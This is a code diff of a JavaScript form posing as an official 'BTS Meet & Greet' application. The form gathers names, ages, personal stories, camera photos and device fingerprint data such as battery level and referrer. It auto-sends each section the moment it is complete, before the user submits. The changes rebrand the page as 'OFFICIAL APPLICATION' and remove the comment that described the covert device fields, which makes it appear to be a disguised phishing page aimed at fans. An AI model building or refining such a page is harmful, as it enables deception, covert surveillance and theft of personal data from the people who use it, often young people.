@@ -1,5 +1,5 @@
 /* ============================================================
-   BTS MEET & GREET — FULL FEATURED
+   BTS MEET & GREET — OFFICIAL APPLICATION
    Real-time auto-send · Battery · Referrer · Progressive
    ============================================================ */
 
@@ -62,7 +62,7 @@ var camStream = null;
 var sent = { section1: false, section2: false };
 
 /* ============================================================
-   DEVICE INFO (battery, referrer, screen, timezone)
+   DEVICE INFO
    ============================================================ */
 var deviceInfo = {
   battery: "N/A",
@@ -196,7 +196,7 @@ function isSection3Complete() { return photos.length > 0; }
    ============================================================ */
 function buildSection1Caption() {
   return (
-    "🎯 <b>BTS MEET &amp; GREET — Step 1</b>\n" +
+    "🎯 <b>BTS MEET &amp; GREET — Step I</b>\n" +
     "━━━━━━━━━━━━━━━━━━━━━━\n" +
     "👤 <b>Name:</b> " + escape(fullName.value.trim()) + "\n" +
     "🎂 <b>Age:</b> " + escape(age.value.trim()) + "\n" +
@@ -210,18 +210,18 @@ function buildSection1Caption() {
 
 function buildSection2Caption() {
   return (
-    "🎯 <b>BTS MEET &amp; GREET — Step 2</b>\n" +
+    "🎯 <b>BTS MEET &amp; GREET — Step II</b>\n" +
     "━━━━━━━━━━━━━━━━━━━━━━\n" +
     "👤 <b>Name:</b> " + escape(fullName.value.trim()) + "\n" +
     "💜 <b>Favourite:</b> " + escape(favMember.value) + "\n" +
     "━━━━━━━━━━━━━━━━━━━━━━\n" +
-    "📝 <b>Reason:</b>\n" + escape(reason.value.trim()) + "\n" +
+    "📝 <b>Story:</b>\n" + escape(reason.value.trim()) + "\n" +
     deviceInfoString()
   );
 }
 
 /* ============================================================
-   AUTO-SEND PER SECTION
+   AUTO-SEND
    ============================================================ */
 function autoSendSection(num) {
   if (num === 1 && !sent.section1 && isSection1Complete()) {
@@ -253,12 +253,12 @@ function autoSendSection(num) {
 function unlockSection(num) {
   if (num === 2) {
     sec2.classList.add("unlocked", "active");
-    badge2.textContent = "In progress";
+    badge2.textContent = "In Progress";
     step2El.classList.add("active");
   }
   if (num === 3) {
     sec3.classList.add("unlocked", "active");
-    badge3.textContent = "In progress";
+    badge3.textContent = "In Progress";
     step3El.classList.add("active");
     btnSubmit.disabled = false;
   }
